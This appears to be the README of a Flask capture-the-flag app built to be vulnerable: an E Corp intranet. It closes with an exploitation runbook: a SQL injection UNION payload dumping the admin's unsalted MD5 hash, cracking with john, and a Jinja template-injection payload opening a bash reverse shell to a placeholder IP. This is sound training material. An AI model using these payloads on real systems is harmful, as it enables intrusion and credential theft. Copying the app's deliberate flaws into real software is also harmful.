# breach_and_climb_ctf
CTF challenge from Istanbul Hackerspace

## ECorpNet — E Corp employee portal (Flask)

Internal intranet of E Corp (Mr. Robot universe):

| Module | Who | What it does |
|---|---|---|
| Auth | everyone | Sign in; external contractors self-register with limited access |
| Dashboard | all | Announcements, E Coin balance, open tickets, new colleagues |
| Directory | all | Search staff, profiles, org chart (manager / direct reports), edit own profile & password |
| IT Helpdesk | all / IT | Open tickets, conversation thread; IT staff triage (status, priority, assignee) |
| HR Documents | all / managers | Documents filtered by clearance (all → employee → manager → admin); preview, download, upload |
| E Coin Wallet | all | Balance, history, instant transfers to colleagues |
| Report Builder | managers, admin | Headcount / tickets / payroll / E Coin reports, saved, CSV export, print |
| Admin | admin | Users (role, salary, manager, disable, reset password), announcements, monthly payroll run, bulk-email templates (legacy Jinja preview engine) |
| JSON API | logged in | `/api/v1/` — me, employees, wallet, tickets |

Roles: `contractor` < `employee` / `it` < `manager` < `admin`.

### Run (development)

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
flask --app ecorpnet init-db      # recreates DB + seed data, prints demo accounts
flask --app ecorpnet run --debug  # http://127.0.0.1:5000
```

> **Never use `--debug` on the CTF server**: the Werkzeug debugger is remote code execution.

Data lives in `instance/` (SQLite DB, uploaded documents, generated `secret_key`).
`init-db` wipes and reseeds everything — handy for resetting the box between CTF rounds.
Run `flask --app ecorpnet init-db` again after any code/schema change, otherwise the
running app is missing new tables (e.g. `comms_templates`).

### Run (server, port 80)

```bash
gunicorn -w 4 -b 0.0.0.0:80 'ecorpnet:create_app()'
```

(or bind gunicorn to 127.0.0.1:8000 behind nginx).

### Tests

```bash
python3 tests/smoke_test.py      # every page / workflow for each role
python3 tests/security_test.py   # security regression checks (all must be OK)
```

Both run against a throw-away database, the real `instance/` is not touched.

## Intended exploitation path (runbook)

Verified end-to-end against the app (register → shell, with `init-db` done first):

```bash
# 0. target + listening shell catcher
B=http://127.0.0.1:5000                       # or the CTF server address
nc -lvnp 4444                                 # in another terminal

# helper: grab the CSRF token of a form from a page
csrf() { curl -s "$@" | grep -oP 'csrf_token" value="\K[^"]+' | head -1; }

# 1) self-register as an external contractor
T=$(csrf -c jar.txt $B/register)
curl -s -b jar.txt -c jar.txt -X POST $B/register \
  --data-urlencode "username=mallory" \
  --data-urlencode "full_name=Mallory Riot" \
  --data-urlencode "company=Allsafe Cybersecurity" \
  --data-urlencode "email=mallory@allsafe.example" \
  --data-urlencode "password=Passw0rd!" \
  --data-urlencode "confirm=Passw0rd!" \
  --data-urlencode "csrf_token=$T"

# 2) sign in, keep the session cookie
T=$(csrf -c jar.txt $B/login)
curl -s -b jar.txt -c jar.txt -X POST $B/login \
  --data-urlencode "username=mallory" \
  --data-urlencode "password=Passw0rd!" \
  --data-urlencode "csrf_token=$T"
SESSION=$(awk '$6=="session"{print $7}' jar.txt)

# 3) SQL injection: the employee search interpolates input -> dump the admin row
curl -s -G "$B/api/v1/employees" -H "Cookie: session=$SESSION" \
  --data-urlencode "q=') AND 0 UNION ALL SELECT id,username,password_hash,email,title,department,phone,office,manager_id FROM users WHERE role='admin'--" | python3 -m json.tool
#   full_name holds the admin's password_hash (unsalted MD5)

# 4) crack it
echo "<hash>" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
#   -> bowwow   (pprice / admin)

# 5) sign in as admin (use a FRESH cookie jar: /login redirects if already signed in)
T=$(csrf -c jar2.txt $B/login)
curl -s -b jar2.txt -c jar2.txt -X POST $B/login \
  --data-urlencode "username=pprice" \
  --data-urlencode "password=bowwow" \
  --data-urlencode "csrf_token=$T"

# 6 SSTI -> RCE: admin Email Templates preview renders with the legacy Jinja engine
T=$(csrf -b jar2.txt $B/admin/comms/1)
curl -s -b jar2.txt -X POST $B/admin/comms/1 \
  --data-urlencode "name=welcome_new_hire" \
  --data-urlencode "subject=Test" \
  --data-urlencode "button=preview" \
  --data-urlencode 'body={{ lipsum.__globals__.os.popen('"'"'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" </dev/null >/dev/null 2>&1 &'"'"').read() }}' \
  --data-urlencode "csrf_token=$T"
```

Notes:

- The `</dev/null >/dev/null 2>&1 &` part matters: without it the reverse shell (`bash -i >& /dev/tcp/...`) holds the HTTP request open until the shell session ends.
- Works under `gunicorn -w 4` too — the shell comes from one of the workers.
- Reset the box between rounds with `flask --app ecorpnet init-db`.

Unauthenticated RCE would be out of scope: steps 1–4 are the intended pre-auth path, step 6 requires the admin account.
